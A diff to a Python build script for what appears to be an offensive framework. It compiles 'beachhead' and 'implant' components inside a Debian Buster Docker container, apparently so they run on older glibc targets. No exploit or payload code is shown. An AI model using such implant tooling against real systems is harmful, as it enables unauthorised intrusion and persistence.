@@ -18,7 +18,15 @@ os.system(f"openssl req -x509 -newkey rsa:4096 -keyout {PRIV_KEY} -out {PUB_KEY}
 # Compile beachhead
 print(f"Compiling {BEACHHEAD_DIR}...")
 try:
-    subprocess.run(['make'], cwd=BEACHHEAD_DIR, check=True)
+    # Use Docker to compile against Debian Buster's glibc 2.28
+    abs_beachhead_path = os.path.abspath(BEACHHEAD_DIR)
+    subprocess.run([
+        'docker', 'run', '--rm',
+        '-v', f"{abs_beachhead_path}:/build",
+        '-w', '/build',
+        'debian:buster-slim',
+        'sh', '-c', 'apt-get update && apt-get install -y g++ make && make'
+    ], check=True)
     print(f"{BEACHHEAD_DIR} compiled successfully")
 except subprocess.CalledProcessError as e:
     print(f"Error compiling {BEACHHEAD_DIR}: {e}")
@@ -32,7 +40,15 @@ time.sleep(1)
 # Compile implant
 print(f"Compiling {IMPLANT_DIR}...")
 try:
-    subprocess.run(['make'], cwd=IMPLANT_DIR, check=True)
+    # Use Docker to compile against Debian Buster's glibc 2.28
+    abs_implant_path = os.path.abspath(IMPLANT_DIR)
+    subprocess.run([
+        'docker', 'run', '--rm',
+        '-v', f"{abs_implant_path}:/build",
+        '-w', '/build',
+        'debian:buster-slim',
+        'sh', '-c', 'apt-get update && apt-get install -y g++ make && make'
+    ], check=True)
     print(f"{IMPLANT_DIR} compiled successfully")
 except subprocess.CalledProcessError as e:
     print(f"Error compiling {IMPLANT_DIR}: {e}")
